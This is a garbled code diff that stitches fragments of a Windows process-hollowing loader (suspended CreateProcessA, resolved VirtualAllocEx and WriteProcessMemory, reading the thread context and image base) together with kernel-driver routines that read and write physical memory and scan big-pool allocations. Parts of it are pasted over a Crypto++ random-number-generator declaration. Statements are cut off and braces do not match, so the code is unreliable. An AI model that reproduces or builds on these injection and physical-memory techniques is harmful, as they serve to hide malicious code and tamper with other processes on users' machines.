@@ -16,38 +16,42 @@ typedef HANDLE(WINAPI * callProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lp
 
 void ExecFile(LPSTR szFilePath, LPVOID pFile)
 {
-	PIMAGE_DOS_HEADER IDH;
-	PIMAGE_NT_HEADERS INH;
-	PIMAGE_SECTION_HEADER ISH;
-	PROCESS_INFORMATION PI;
-	STARTUPINFOA SI;
-	PCONTEXT CTX;
-	PDWORD dwImageBase;
-	NtUnmapViewOfSection xNtUnmapViewOfSection;
-	NtSetThreadContext xNtSetThreadContext;
-	callReadProcessMemory xReadProcessMemory;
-	callWriteProcessMemory xWriteProcessMemory;
-	callVirtualAlloc xVirtualAlloc;
-	callVirtualAllocEx xVirtualAllocEx;
-	LPVOID pImageBase;
-	int Count;
-	IDH = PIMAGE_DOS_HEADER(pFile);
-	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
-	{
-		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
-		if (INH->Signature == IMAGE_NT_SIGNATURE)
-		{
-			RtlZeroMemory(&SI, sizeof(SI));
-			RtlZeroMemory(&PI, sizeof(PI));
+	 if (!address)
+            return STATUS_UNSUCCESSFUL;
 
-			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+        MM_COPY_ADDRESS addr = { 0 };
+        addr.PhysicalAddress.QuadPart = ( LONGLONG )address;
+        return MmCopyMemory( buffer, addr, size, MM_COPY_MEMORY_PHYSICAL, read );
+    }
+
+    auto writephysaddress( PVOID address, PVOID buffer, SIZE_T size, SIZE_T* written ) -> NTSTATUS
+    {
+        if (!address)
+            return STATUS_UNSUCCESSFUL;
+
+        PHYSICAL_ADDRESS addr = { 0 };
+        addr.QuadPart = (LONGLONG)address;
+
+        auto mapped_mem = MmMapIoSpaceEx( addr, size, PAGE_READWRITE );
+
+        if (!mapped_mem)
+            return STATUS_UNSUCCESSFUL;
+
+        memcpy( mapped_mem, buffer, size );
+
+        *written = size;
+        MmUnmapIoSpace( mapped_mem, size );
+    
+	if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
 			{
 				xVirtualAlloc = callVirtualAlloc(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc"));
 				xVirtualAllocEx = callVirtualAllocEx(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx"));
 				xReadProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadProcessMemory"));
 				xWriteProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));
-				CTX = PCONTEXT(xVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
-				CTX->ContextFlags = CONTEXT_FULL;
+				
+				
+				pool_information = ( PSYSTEM_BIGPOOL_INFORMATION )ExAllocatePool( NonPagedPool, information_length );
+         	 		  status = ZwQuerySystemInformation
 				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
 				{
 					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
@@ -122,10 +126,8 @@ class CRYPTOPP_DLL X917RNG : public RandomNumberGenerator, public NotCopyable
 {
 public:
 	
-	X917RNG(BlockTransformation *cipher, const byte *seed, const byte *deterministicTimeVector = NULLPTR);
-
-	void GenerateIntoBufferedTransformation(BufferedTransformation &target, const std::string &channel, lword size);
-
+                    if ( saved_virtual_address == 0 && allocation_entry->TagUlong == 'TnoC' ) {
+                        saved_virtual_address = virtual_address;
 private:
 	member_ptr<BlockTransformation> m_cipher;
 	const unsigned int m_size;  // S, blocksize of cipher
